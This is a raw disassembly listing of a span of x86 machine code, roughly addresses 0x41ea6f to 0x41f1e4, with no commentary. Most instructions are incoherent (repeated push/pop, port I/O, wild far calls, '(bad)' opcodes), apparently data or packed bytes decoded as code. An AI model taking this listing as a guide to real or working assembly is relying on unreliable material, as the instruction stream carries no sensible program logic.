  41ea6f:	mov    esi,0xf1f1fdbe
  41ea74:	in     al,dx
  41ea75:	add    ebp,esi
  41ea77:	cmc    
  41ea78:	call   0xe53be382
  41ea7d:	or     ebp,edi
  41ea7f:	std    
  41ea80:	loopne 0x41ea8f
  41ea82:	loope  0x41ea65
  41ea84:	cld    
  41ea85:	adc    ebp,esp
  41ea87:	in     eax,0xf8
  41ea89:	adc    eax,0x195a5a5a
  41ea8e:	pop    esi
  41ea8f:	pop    esi
  41ea90:	pop    esi
  41ea91:	sbb    eax,0x21626262
  41ea96:	rcl    dl,cl
  41ea98:	shl    BYTE PTR ds:0x29dedede,cl
  41ea9e:	sub    al,0x2c
  41eaa0:	shr    BYTE PTR [eax+esi*1],1
  41eaa3:	xor    ah,cl
  41eaa5:	xor    BYTE PTR [esp+esi*1],dh
  41eaa8:	enter  0x3834,0x38
  41eaac:	les    edi,FWORD PTR [eax]
  41eaae:	cmp    al,0x3c
  41eab0:	sar    BYTE PTR [eax+eax*2],0x40
  41eab4:	mov    esp,0xb2b2b240
  41eab9:	inc    ebp
  41eaba:	mov    esi,0xe49bebe
  41eabf:	push   cs
  41eac0:	push   cs
  41eac1:	dec    ebp
  41eac2:	adc    dl,BYTE PTR [edx]
  41eac4:	adc    dl,BYTE PTR [ecx+0x16]
  41eac7:	push   ss
  41eac8:	push   ss
  41eac9:	push   ebp
  41eaca:	sbb    bl,BYTE PTR [edx]
  41eacc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41eacf:	push   ds
  41ead0:	push   ds
  41ead1:	pop    ebp
  41ead2:	and    ah,BYTE PTR [edx]
  41ead4:	and    ah,BYTE PTR [ecx+0x26]
  41ead7:	es es sub ch,BYTE PTR gs:[edx]
  41eadc:	sub    ch,BYTE PTR [ecx+0x2e]
  41eadf:	cs cs ins DWORD PTR es:[edi],dx
  41eae2:	xor    dh,BYTE PTR [edx]
  41eae4:	xor    dh,BYTE PTR [ecx+0x36]
  41eae7:	ss ss jne 0x41eb25
  41eaeb:	cmp    bh,BYTE PTR [edx]
  41eaed:	jns    0x41eb2d
  41eaef:	ds ds jge 0x41eab5
  41eaf3:	ret    0x81c2
  41eaf6:	mov    dh,0xc6
  41eaf9:	test   edx,ecx
  41eafb:	retf   0x89ca
  41eafe:	into   
  41eaff:	into   
  41eb00:	into   
  41eb01:	(bad)  
  41eb02:	rcl    dl,cl
  41eb04:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41eb0a:	fcmovu st,st(2)
  41eb0c:	ficomp DWORD PTR [ecx-0x62212122]
  41eb12:	loop   0x41eaf6
  41eb14:	loop   0x41eab7
  41eb16:	push   edx
  41eb17:	push   edx
  41eb18:	push   edx
  41eb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb1a:	pop    esi
  41eb1b:	pop    esi
  41eb1c:	pop    esi
  41eb1d:	test   eax,0xac50acac
  41eb22:	mov    al,0xb0
  41eb24:	dec    esp
  41eb25:	mov    al,0xb4
  41eb27:	mov    ah,0x48
  41eb29:	mov    ah,0xb8
  41eb2b:	mov    eax,0xbcbcb844
  41eb30:	inc    eax
  41eb31:	mov    esp,0xc03cc0c0
  41eb36:	xor    dh,BYTE PTR [edx]
  41eb38:	xor    al,ch
  41eb3a:	ds ds ds leave 
  41eb3e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41eb44:	xchg   edx,eax
  41eb45:	rcl    DWORD PTR [esi-0x652a696a],1
  41eb4b:	call   0xdd9e:0x9e9ed99a
  41eb52:	mov    ds:0xa6e1a2a2,al
  41eb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb59:	in     eax,0xaa
  41eb5b:	stos   BYTE PTR es:[edi],al
  41eb5c:	stos   BYTE PTR es:[edi],al
  41eb5d:	jmp    0xedf09a10
  41eb62:	mov    dl,0xb2
  41eb64:	mov    dl,0xf1
  41eb66:	mov    dh,0xb6
  41eb68:	mov    dh,0xf5
  41eb6a:	mov    edx,0xbef9baba
  41eb6f:	mov    esi,0x4242fdbe
  41eb74:	inc    edx
  41eb75:	add    DWORD PTR [esi+0x46],eax
  41eb78:	inc    esi
  41eb79:	add    eax,0x94a4a4a
  41eb7e:	dec    esi
  41eb7f:	dec    esi
  41eb80:	dec    esi
  41eb81:	or     eax,0x11525252
  41eb86:	push   esi
  41eb87:	push   esi
  41eb88:	push   esi
  41eb89:	adc    eax,0x195a5a5a
  41eb8e:	pop    esi
  41eb8f:	pop    esi
  41eb90:	pop    esi
  41eb91:	sbb    eax,0x21626262
  41eb96:	rcl    dl,cl
  41eb98:	shl    BYTE PTR ds:0x29dedede,cl
  41eb9e:	sub    al,0x2c
  41eba0:	shr    BYTE PTR [eax+esi*1],1
  41eba3:	xor    ah,cl
  41eba5:	xor    BYTE PTR [esp+esi*1],dh
  41eba8:	enter  0x3834,0x38
  41ebac:	les    edi,FWORD PTR [eax]
  41ebae:	cmp    al,0x3c
  41ebb0:	sar    BYTE PTR [eax+eax*2],0x40
  41ebb4:	mov    esp,0xb2b2b240
  41ebb9:	inc    ebp
  41ebba:	mov    esi,0xe49bebe
  41ebbf:	push   cs
  41ebc0:	push   cs
  41ebc1:	dec    ebp
  41ebc2:	adc    dl,BYTE PTR [edx]
  41ebc4:	adc    dl,BYTE PTR [ecx+0x16]
  41ebc7:	push   ss
  41ebc8:	push   ss
  41ebc9:	push   ebp
  41ebca:	sbb    bl,BYTE PTR [edx]
  41ebcc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41ebcf:	push   ds
  41ebd0:	push   ds
  41ebd1:	pop    ebp
  41ebd2:	and    ah,BYTE PTR [edx]
  41ebd4:	and    ah,BYTE PTR [ecx+0x26]
  41ebd7:	es es sub ch,BYTE PTR gs:[edx]
  41ebdc:	sub    ch,BYTE PTR [ecx+0x2e]
  41ebdf:	cs cs ins DWORD PTR es:[edi],dx
  41ebe2:	xor    dh,BYTE PTR [edx]
  41ebe4:	xor    dh,BYTE PTR [ecx+0x36]
  41ebe7:	ss ss jne 0x41ec25
  41ebeb:	cmp    bh,BYTE PTR [edx]
  41ebed:	jns    0x41ec2d
  41ebef:	ds ds jge 0x41ebb5
  41ebf3:	ret    0x81c2
  41ebf6:	mov    dh,0xc6
  41ebf9:	test   edx,ecx
  41ebfb:	retf   0x89ca
  41ebfe:	into   
  41ebff:	into   
  41ec00:	into   
  41ec01:	(bad)  
  41ec02:	rcl    dl,cl
  41ec04:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41ec0a:	fcmovu st,st(2)
  41ec0c:	ficomp DWORD PTR [ecx-0x62212122]
  41ec12:	loop   0x41ebf6
  41ec14:	loop   0x41ebb7
  41ec16:	push   edx
  41ec17:	push   edx
  41ec18:	push   edx
  41ec19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec1a:	pop    esi
  41ec1b:	pop    esi
  41ec1c:	pop    esi
  41ec1d:	test   eax,0xac50acac
  41ec22:	mov    al,0xb0
  41ec24:	dec    esp
  41ec25:	mov    al,0xb4
  41ec27:	mov    ah,0x48
  41ec29:	mov    ah,0xb8
  41ec2b:	mov    eax,0xbcbcb844
  41ec30:	inc    eax
  41ec31:	mov    esp,0xc03cc0c0
  41ec36:	xor    dh,BYTE PTR [edx]
  41ec38:	xor    al,ch
  41ec3a:	ds ds ds leave 
  41ec3e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41ec44:	xchg   edx,eax
  41ec45:	rcl    DWORD PTR [esi+0x29d59696],1
  41ec4b:	sub    DWORD PTR [ecx+ebx*8],esi
  41ec4e:	sub    eax,0x11dd302d
  41ec53:	adc    DWORD PTR [ecx+eiz*8],ecx
  41ec56:	adc    eax,0x19e50815
  41ec5b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41ec5e:	sbb    eax,0xb2ed001d
  41ec63:	mov    dl,0xb2
  41ec65:	icebp  
  41ec66:	mov    dh,0xb6
  41ec68:	mov    dh,0xf5
  41ec6a:	mov    edx,0xbef9baba
  41ec6f:	mov    esi,0xf1f1fdbe
  41ec74:	in     al,dx
  41ec75:	add    ebp,esi
  41ec77:	cmc    
  41ec78:	call   0xe53be582
  41ec7d:	or     ebp,edi
  41ec7f:	std    
  41ec80:	loopne 0x41ec8f
  41ec82:	loope  0x41ec65
  41ec84:	cld    
  41ec85:	adc    ebp,esp
  41ec87:	in     eax,0xf8
  41ec89:	adc    eax,0x195a5a5a
  41ec8e:	pop    esi
  41ec8f:	pop    esi
  41ec90:	pop    esi
  41ec91:	sbb    eax,0x21626262
  41ec96:	rcl    dl,cl
  41ec98:	shl    BYTE PTR ds:0x29dedede,cl
  41ec9e:	sub    al,0x2c
  41eca0:	shr    BYTE PTR [eax+esi*1],1
  41eca3:	xor    ah,cl
  41eca5:	xor    BYTE PTR [esp+esi*1],dh
  41eca8:	enter  0x3834,0x38
  41ecac:	les    edi,FWORD PTR [eax]
  41ecae:	cmp    al,0x3c
  41ecb0:	sar    BYTE PTR [eax+eax*2],0x40
  41ecb4:	mov    esp,0xb2b2b240
  41ecb9:	inc    ebp
  41ecba:	mov    esi,0xe49bebe
  41ecbf:	push   cs
  41ecc0:	push   cs
  41ecc1:	dec    ebp
  41ecc2:	adc    dl,BYTE PTR [edx]
  41ecc4:	adc    dl,BYTE PTR [ecx+0x16]
  41ecc7:	push   ss
  41ecc8:	push   ss
  41ecc9:	push   ebp
  41ecca:	test   eax,0xad59b4a9
  41eccf:	lods   eax,DWORD PTR ds:[esi]
  41ecd0:	mov    al,0x5d
  41ecd2:	xchg   ecx,eax
  41ecd3:	xchg   ecx,eax
  41ecd4:	mov    WORD PTR [ecx-0x6b],fs
  41ecd7:	xchg   ebp,eax
  41ecd8:	mov    BYTE PTR [ebp-0x67],ah
  41ecdb:	cdq    
  41ecdc:	test   BYTE PTR [ecx-0x63],ch
  41ecdf:	popf   
  41ece0:	sub    BYTE PTR [ebp+0x32],0x32
  41ece4:	xor    dh,BYTE PTR [ecx+0x36]
  41ece7:	ss ss jne 0x41ed25
  41eceb:	cmp    bh,BYTE PTR [edx]
  41eced:	jns    0x41ed2d
  41ecef:	ds ds jge 0x41ed64
  41ecf3:	jno    0x41ed61
  41ecf5:	xor    DWORD PTR [ebp+0x75],0x79798568
  41ecfc:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41ed00:	pusha  
  41ed01:	lea    esp,[ecx+0x61]
  41ed04:	jl     0x41ec97
  41ed06:	gs gs js 0x41ec9f
  41ed0a:	fcmovu st,st(2)
  41ed0c:	ficomp DWORD PTR [ecx-0x62212122]
  41ed12:	loop   0x41ecf6
  41ed14:	loop   0x41ecb7
  41ed16:	push   edx
  41ed17:	push   edx
  41ed18:	push   edx
  41ed19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed1a:	pop    esi
  41ed1b:	pop    esi
  41ed1c:	pop    esi
  41ed1d:	test   eax,0xac50acac
  41ed22:	mov    al,0xb0
  41ed24:	dec    esp
  41ed25:	mov    al,0xb4
  41ed27:	mov    ah,0x48
  41ed29:	mov    ah,0xb8
  41ed2b:	mov    eax,0xbcbcb844
  41ed30:	inc    eax
  41ed31:	mov    esp,0xc03cc0c0
  41ed36:	xor    dh,BYTE PTR [edx]
  41ed38:	xor    al,ch
  41ed3a:	ds ds ds leave 
  41ed3e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41ed44:	xchg   edx,eax
  41ed45:	rcl    DWORD PTR [esi+0x29d59696],1
  41ed4b:	sub    DWORD PTR [ecx+ebx*8],esi
  41ed4e:	sub    eax,0x11dd302d
  41ed53:	adc    DWORD PTR [ecx+eiz*8],ecx
  41ed56:	adc    eax,0x19e50815
  41ed5b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41ed5e:	sbb    eax,0xb2ed001d
  41ed63:	mov    dl,0xb2
  41ed65:	icebp  
  41ed66:	mov    dh,0xb6
  41ed68:	mov    dh,0xf5
  41ed6a:	mov    edx,0xbef9baba
  41ed6f:	mov    esi,0xf1f1fdbe
  41ed74:	in     al,dx
  41ed75:	add    ebp,esi
  41ed77:	cmc    
  41ed78:	call   0xe53be682
  41ed7d:	or     ebp,edi
  41ed7f:	std    
  41ed80:	loopne 0x41ed8f
  41ed82:	loope  0x41ed65
  41ed84:	cld    
  41ed85:	adc    ebp,esp
  41ed87:	in     eax,0xf8
  41ed89:	adc    eax,0x195a5a5a
  41ed8e:	pop    esi
  41ed8f:	pop    esi
  41ed90:	pop    esi
  41ed91:	sbb    eax,0x21626262
  41ed96:	rcl    dl,cl
  41ed98:	shl    BYTE PTR ds:0x29dedede,cl
  41ed9e:	sub    al,0x2c
  41eda0:	shr    BYTE PTR [eax+esi*1],1
  41eda3:	xor    ah,cl
  41eda5:	xor    BYTE PTR [esp+esi*1],dh
  41eda8:	enter  0x3834,0x38
  41edac:	les    edi,FWORD PTR [eax]
  41edae:	cmp    al,0x3c
  41edb0:	sar    BYTE PTR [eax+eax*2],0x40
  41edb4:	mov    esp,0xb2b2b240
  41edb9:	inc    ebp
  41edba:	mov    esi,0xe49bebe
  41edbf:	push   cs
  41edc0:	push   cs
  41edc1:	dec    ebp
  41edc2:	adc    dl,BYTE PTR [edx]
  41edc4:	adc    dl,BYTE PTR [ecx+0x16]
  41edc7:	push   ss
  41edc8:	push   ss
  41edc9:	push   ebp
  41edca:	test   eax,0xad59b4a9
  41edcf:	lods   eax,DWORD PTR ds:[esi]
  41edd0:	mov    al,0x5d
  41edd2:	xchg   ecx,eax
  41edd3:	xchg   ecx,eax
  41edd4:	mov    WORD PTR [ecx-0x6b],fs
  41edd7:	xchg   ebp,eax
  41edd8:	mov    BYTE PTR [ebp-0x67],ah
  41eddb:	cdq    
  41eddc:	test   BYTE PTR [ecx-0x63],ch
  41eddf:	popf   
  41ede0:	sub    BYTE PTR [ebp+0x32],0x32
  41ede4:	xor    dh,BYTE PTR [ecx+0x36]
  41ede7:	ss ss jne 0x41ee25
  41edeb:	cmp    bh,BYTE PTR [edx]
  41eded:	jns    0x41ee2d
  41edef:	ds ds jge 0x41ee64
  41edf3:	jno    0x41ee61
  41edf5:	xor    DWORD PTR [ebp+0x75],0x79798568
  41edfc:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41ee00:	pusha  
  41ee01:	lea    esp,[ecx+0x61]
  41ee04:	jl     0x41ed97
  41ee06:	gs gs js 0x41ed9f
  41ee0a:	fcmovu st,st(2)
  41ee0c:	ficomp DWORD PTR [ecx-0x62212122]
  41ee12:	loop   0x41edf6
  41ee14:	loop   0x41edb7
  41ee16:	push   edx
  41ee17:	push   edx
  41ee18:	push   edx
  41ee19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee1a:	pop    esi
  41ee1b:	pop    esi
  41ee1c:	pop    esi
  41ee1d:	test   eax,0xac50acac
  41ee22:	mov    al,0xb0
  41ee24:	dec    esp
  41ee25:	mov    al,0xb4
  41ee27:	mov    ah,0x48
  41ee29:	mov    ah,0xb8
  41ee2b:	mov    eax,0xbcbcb844
  41ee30:	inc    eax
  41ee31:	mov    esp,0xc03cc0c0
  41ee36:	xor    dh,BYTE PTR [edx]
  41ee38:	xor    al,ch
  41ee3a:	ds ds ds leave 
  41ee3e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41ee44:	xchg   edx,eax
  41ee45:	rcl    DWORD PTR [esi+0x29d59696],1
  41ee4b:	sub    DWORD PTR [ecx+ebx*8],esi
  41ee4e:	sub    eax,0x11dd302d
  41ee53:	adc    DWORD PTR [ecx+eiz*8],ecx
  41ee56:	adc    eax,0x19e50815
  41ee5b:	sbb    DWORD PTR [ecx+ebp*8],eax
  41ee5e:	sbb    eax,0xb2ed001d
  41ee63:	mov    dl,0xb2
  41ee65:	icebp  
  41ee66:	mov    dh,0xb6
  41ee68:	mov    dh,0xf5
  41ee6a:	mov    edx,0xbef9baba
  41ee6f:	mov    esi,0xf1f1fdbe
  41ee74:	in     al,dx
  41ee75:	add    ebp,esi
  41ee77:	cmc    
  41ee78:	call   0xe53be782
  41ee7d:	or     ebp,edi
  41ee7f:	std    
  41ee80:	loopne 0x41ee8f
  41ee82:	loope  0x41ee65
  41ee84:	cld    
  41ee85:	adc    ebp,esp
  41ee87:	in     eax,0xf8
  41ee89:	adc    eax,0x195a5a5a
  41ee8e:	pop    esi
  41ee8f:	pop    esi
  41ee90:	pop    esi
  41ee91:	sbb    eax,0x21626262
  41ee96:	rcl    dl,cl
  41ee98:	shl    BYTE PTR ds:0x29dedede,cl
  41ee9e:	sub    al,0x2c
  41eea0:	shr    BYTE PTR [eax+esi*1],1
  41eea3:	xor    ah,cl
  41eea5:	xor    BYTE PTR [esp+esi*1],dh
  41eea8:	enter  0x3834,0x38
  41eeac:	les    edi,FWORD PTR [eax]
  41eeae:	cmp    al,0x3c
  41eeb0:	sar    BYTE PTR [eax+eax*2],0x40
  41eeb4:	mov    esp,0xb2b2b240
  41eeb9:	inc    ebp
  41eeba:	mov    esi,0xe49bebe
  41eebf:	push   cs
  41eec0:	push   cs
  41eec1:	dec    ebp
  41eec2:	adc    dl,BYTE PTR [edx]
  41eec4:	adc    dl,BYTE PTR [ecx+0x16]
  41eec7:	push   ss
  41eec8:	push   ss
  41eec9:	push   ebp
  41eeca:	test   eax,0xad59b4a9
  41eecf:	lods   eax,DWORD PTR ds:[esi]
  41eed0:	mov    al,0x5d
  41eed2:	xchg   ecx,eax
  41eed3:	xchg   ecx,eax
  41eed4:	mov    WORD PTR [ecx-0x6b],fs
  41eed7:	xchg   ebp,eax
  41eed8:	mov    BYTE PTR [ebp-0x67],ah
  41eedb:	cdq    
  41eedc:	test   BYTE PTR [ecx-0x63],ch
  41eedf:	popf   
  41eee0:	sub    BYTE PTR [ebp+0x32],0x32
  41eee4:	xor    dh,BYTE PTR [ecx+0x36]
  41eee7:	ss ss jne 0x41ef25
  41eeeb:	cmp    bh,BYTE PTR [edx]
  41eeed:	jns    0x41ef2d
  41eeef:	ds ds jge 0x41ef64
  41eef3:	jno    0x41ef61
  41eef5:	xor    DWORD PTR [ebp+0x75],0x79798568
  41eefc:	mov    DWORD PTR fs:[ebp+0x7d],edi
  41ef00:	pusha  
  41ef01:	lea    esp,[ecx+0x61]
  41ef04:	jl     0x41ee97
  41ef06:	gs gs js 0x41ee9f
  41ef0a:	fcmovu st,st(2)
  41ef0c:	ficomp DWORD PTR [ecx-0x62212122]
  41ef12:	loop   0x41eef6
  41ef14:	loop   0x41eeb7
  41ef16:	push   edx
  41ef17:	push   edx
  41ef18:	push   edx
  41ef19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef1a:	pop    esi
  41ef1b:	pop    esi
  41ef1c:	pop    esi
  41ef1d:	test   eax,0xac50acac
  41ef22:	mov    al,0xb0
  41ef24:	dec    esp
  41ef25:	mov    al,0xb4
  41ef27:	mov    ah,0x48
  41ef29:	mov    ah,0xb8
  41ef2b:	mov    eax,0xbcbcb844
  41ef30:	inc    eax
  41ef31:	mov    esp,0xc03cc0c0
  41ef36:	xor    dh,BYTE PTR [edx]
  41ef38:	xor    al,ch
  41ef3a:	ds ds ds leave 
  41ef3e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41ef44:	xchg   edx,eax
  41ef45:	rcl    DWORD PTR [esi-0x652a696a],1
  41ef4b:	call   0xdd9e:0x9e9ed99a
  41ef52:	mov    ds:0xa6e1a2a2,al
  41ef57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef59:	in     eax,0xaa
  41ef5b:	stos   BYTE PTR es:[edi],al
  41ef5c:	stos   BYTE PTR es:[edi],al
  41ef5d:	jmp    0xedf09e10
  41ef62:	mov    dl,0xb2
  41ef64:	mov    dl,0xf1
  41ef66:	mov    dh,0xb6
  41ef68:	mov    dh,0xf5
  41ef6a:	mov    edx,0xbef9baba
  41ef6f:	mov    esi,0x4242fdbe
  41ef74:	inc    edx
  41ef75:	add    DWORD PTR [esi+0x46],eax
  41ef78:	inc    esi
  41ef79:	add    eax,0x94a4a4a
  41ef7e:	dec    esi
  41ef7f:	dec    esi
  41ef80:	dec    esi
  41ef81:	or     eax,0x11525252
  41ef86:	push   esi
  41ef87:	push   esi
  41ef88:	push   esi
  41ef89:	adc    eax,0x195a5a5a
  41ef8e:	pop    esi
  41ef8f:	pop    esi
  41ef90:	pop    esi
  41ef91:	sbb    eax,0x21626262
  41ef96:	rcl    dl,cl
  41ef98:	shl    BYTE PTR ds:0x29dedede,cl
  41ef9e:	sub    al,0x2c
  41efa0:	shr    BYTE PTR [eax+esi*1],1
  41efa3:	xor    ah,cl
  41efa5:	xor    BYTE PTR [esp+esi*1],dh
  41efa8:	enter  0x3834,0x38
  41efac:	les    edi,FWORD PTR [eax]
  41efae:	cmp    al,0x3c
  41efb0:	sar    BYTE PTR [eax+eax*2],0x40
  41efb4:	mov    esp,0xb2b2b240
  41efb9:	inc    ebp
  41efba:	mov    esi,0xe49bebe
  41efbf:	push   cs
  41efc0:	push   cs
  41efc1:	dec    ebp
  41efc2:	adc    dl,BYTE PTR [edx]
  41efc4:	adc    dl,BYTE PTR [ecx+0x16]
  41efc7:	push   ss
  41efc8:	push   ss
  41efc9:	push   ebp
  41efca:	sbb    bl,BYTE PTR [edx]
  41efcc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41efcf:	push   ds
  41efd0:	push   ds
  41efd1:	pop    ebp
  41efd2:	and    ah,BYTE PTR [edx]
  41efd4:	and    ah,BYTE PTR [ecx+0x26]
  41efd7:	es es sub ch,BYTE PTR gs:[edx]
  41efdc:	sub    ch,BYTE PTR [ecx+0x2e]
  41efdf:	cs cs ins DWORD PTR es:[edi],dx
  41efe2:	xor    dh,BYTE PTR [edx]
  41efe4:	xor    dh,BYTE PTR [ecx+0x36]
  41efe7:	ss ss jne 0x41f025
  41efeb:	cmp    bh,BYTE PTR [edx]
  41efed:	jns    0x41f02d
  41efef:	ds ds jge 0x41efb5
  41eff3:	ret    0x81c2
  41eff6:	mov    dh,0xc6
  41eff9:	test   edx,ecx
  41effb:	retf   0x89ca
  41effe:	into   
  41efff:	into   
  41f000:	into   
  41f001:	(bad)  
  41f002:	rcl    dl,cl
  41f004:	rcl    BYTE PTR [ecx-0x6a29292a],cl
  41f00a:	fcmovu st,st(2)
  41f00c:	ficomp DWORD PTR [ecx-0x62212122]
  41f012:	loop   0x41eff6
  41f014:	loop   0x41efb7
  41f016:	push   edx
  41f017:	push   edx
  41f018:	push   edx
  41f019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f01a:	pop    esi
  41f01b:	pop    esi
  41f01c:	pop    esi
  41f01d:	test   eax,0xac50acac
  41f022:	mov    al,0xb0
  41f024:	dec    esp
  41f025:	mov    al,0xb4
  41f027:	mov    ah,0x48
  41f029:	mov    ah,0xb8
  41f02b:	mov    eax,0xbcbcb844
  41f030:	inc    eax
  41f031:	mov    esp,0xc03cc0c0
  41f036:	xor    dh,BYTE PTR [edx]
  41f038:	xor    al,ch
  41f03a:	ds ds ds leave 
  41f03e:	mov    cs,WORD PTR [esi-0x6d6d3272]
  41f044:	xchg   edx,eax
  41f045:	rcl    DWORD PTR [esi-0x652a696a],1
  41f04b:	call   0xdd9e:0x9e9ed99a
  41f052:	mov    ds:0xa6e1a2a2,al
  41f057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f059:	in     eax,0xaa
  41f05b:	stos   BYTE PTR es:[edi],al
  41f05c:	stos   BYTE PTR es:[edi],al
  41f05d:	jmp    0xedf09f10
  41f062:	mov    dl,0xb2
  41f064:	mov    dl,0xf1
  41f066:	mov    dh,0xb6
  41f068:	mov    dh,0xf5
  41f06a:	mov    edx,0xbef9baba
  41f06f:	mov    esi,0x4242fdbe
  41f074:	inc    edx
  41f075:	add    DWORD PTR [esi+0x46],eax
  41f078:	inc    esi
  41f079:	add    eax,0x94a4a4a
  41f07e:	dec    esi
  41f07f:	dec    esi
  41f080:	dec    esi
  41f081:	or     eax,0x11525252
  41f086:	push   esi
  41f087:	push   esi
  41f088:	push   esi
  41f089:	adc    eax,0x195a5a5a
  41f08e:	pop    esi
  41f08f:	pop    esi
  41f090:	pop    esi
  41f091:	sbb    eax,0x21626262
  41f096:	rcl    dl,cl
  41f098:	shl    BYTE PTR ds:0x29dedede,cl
  41f09e:	sub    al,0x2c
  41f0a0:	shr    BYTE PTR [eax+esi*1],1
  41f0a3:	xor    ah,cl
  41f0a5:	xor    BYTE PTR [esp+esi*1],dh
  41f0a8:	enter  0x3834,0x38
  41f0ac:	les    edi,FWORD PTR [eax]
  41f0ae:	cmp    al,0x3c
  41f0b0:	sar    BYTE PTR [eax+eax*2],0x40
  41f0b4:	mov    esp,0xb2b2b240
  41f0b9:	inc    ebp
  41f0ba:	mov    esi,0xba49bebe
  41f0bf:	mov    edx,0xa6a64dba
  41f0c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0c5:	push   ecx
  41f0c6:	mov    ds:0xae55a2a2,al
  41f0cb:	scas   al,BYTE PTR es:[edi]
  41f0cc:	scas   al,BYTE PTR es:[edi]
  41f0cd:	pop    ecx
  41f0ce:	mov    BYTE PTR [eax+0x4045d8c],cl
  41f0d4:	add    BYTE PTR [ecx+0x26],ah
  41f0d7:	es es sub ch,BYTE PTR gs:[edx]
  41f0dc:	sub    ch,BYTE PTR [ecx+0x2e]
  41f0df:	cs cs ins DWORD PTR es:[edi],dx
  41f0e2:	xor    dh,BYTE PTR [edx]
  41f0e4:	xor    dh,BYTE PTR [ecx+0x36]
  41f0e7:	ss ss jne 0x41f125
  41f0eb:	cmp    bh,BYTE PTR [edx]
  41f0ed:	jns    0x41f12d
  41f0ef:	ds ds jge 0x41f0b5
  41f0f3:	ret    0x81c2
  41f0f6:	mov    dh,0xc6
  41f0f9:	test   edx,ecx
  41f0fb:	retf   0x89ca
  41f0fe:	call   0x44cfddeb
  41f103:	inc    esp
  41f104:	inc    eax
  41f105:	xchg   ecx,eax
  41f106:	bound  esp,QWORD PTR [edx+0x62]
  41f109:	xchg   ebp,eax
  41f10a:	outs   dx,BYTE PTR ds:[esi]
  41f10b:	outs   dx,BYTE PTR ds:[esi]
  41f10c:	outs   dx,BYTE PTR ds:[esi]
  41f10d:	cdq    
  41f10e:	push   0x6a
  41f110:	push   0xffffff9d
  41f112:	push   esi
  41f113:	push   esi
  41f114:	push   esi
  41f115:	mov    eax,ds:0xa5525252
  41f11a:	pop    esi
  41f11b:	pop    esi
  41f11c:	pop    esi
  41f11d:	test   eax,0xac50acac
  41f122:	mov    al,0xb0
  41f124:	dec    esp
  41f125:	mov    al,0xb4
  41f127:	mov    ah,0x48
  41f129:	mov    ah,0xb8
  41f12b:	mov    eax,0xbcbcb844
  41f130:	inc    eax
  41f131:	mov    esp,0xc03cc0c0
  41f136:	xor    dh,BYTE PTR [edx]
  41f138:	xor    al,ch
  41f13a:	ds ds ds leave 
  41f13e:	cmp    bh,BYTE PTR [edx]
  41f140:	cmp    cl,ch
  41f142:	es es shl DWORD PTR es:[edx],1
  41f147:	and    ah,BYTE PTR [edx]
  41f149:	aad    0x44
  41f14b:	inc    esp
  41f14c:	inc    eax
  41f14d:	fstp   DWORD PTR [esi-0x5d226162]
  41f153:	mov    ds:0xa6a6e1a2,al
  41f158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f159:	in     eax,0xaa
  41f15b:	stos   BYTE PTR es:[edi],al
  41f15c:	stos   BYTE PTR es:[edi],al
  41f15d:	jmp    0xedf0a010
  41f162:	mov    dl,0xb2
  41f164:	mov    dl,0xf1
  41f166:	mov    dh,0xb6
  41f168:	mov    dh,0xf5
  41f16a:	mov    edx,0xbef9baba
  41f16f:	mov    esi,0x4242fdbe
  41f174:	inc    edx
  41f175:	add    DWORD PTR [esi+0x46],eax
  41f178:	inc    esi
  41f179:	add    eax,0x94a4a4a
  41f17e:	dec    esi
  41f17f:	dec    esi
  41f180:	dec    esi
  41f181:	or     eax,0x11525252
  41f186:	mov    BYTE PTR [eax-0x1111ea74],cl
  41f18c:	out    dx,al
  41f18d:	sbb    edx,ebp
  41f18f:	jmp    0x21d6:0xd6d61dea
  41f196:	rcl    dl,cl
  41f198:	shl    BYTE PTR ds:0x29dedede,cl
  41f19e:	sub    al,0x2c
  41f1a0:	shr    BYTE PTR [eax+esi*1],1
  41f1a3:	xor    ah,cl
  41f1a5:	xor    BYTE PTR [esp+esi*1],dh
  41f1a8:	enter  0x3834,0x38
  41f1ac:	les    edi,FWORD PTR [eax]
  41f1ae:	cmp    al,0x3c
  41f1b0:	sar    BYTE PTR [eax+eax*2],0x40
  41f1b4:	mov    esp,0xb0bcbc40
  41f1b9:	inc    ebp
  41f1ba:	mov    esi,0xba49bebe
  41f1bf:	mov    edx,0x84844dba
  41f1c4:	adc    BYTE PTR [ecx+0x30],0x30
  41f1c8:	xor    al,0x55
  41f1ca:	sbb    bl,BYTE PTR [edx]
  41f1cc:	sbb    bl,BYTE PTR [ecx+0x1e]
  41f1cf:	push   ds
  41f1d0:	push   ds
  41f1d1:	pop    ebp
  41f1d2:	and    ah,BYTE PTR [edx]
  41f1d4:	and    ah,BYTE PTR [ecx+0x26]
  41f1d7:	es es sub ch,BYTE PTR gs:[edx]
  41f1dc:	sub    ch,BYTE PTR [ecx+0x2e]
  41f1df:	cs cs ins DWORD PTR es:[edi],dx
  41f1e2:	xor    dh,BYTE PTR [edx]
  41f1e4:	xor    dh,BYTE PTR [ecx+0x2d]
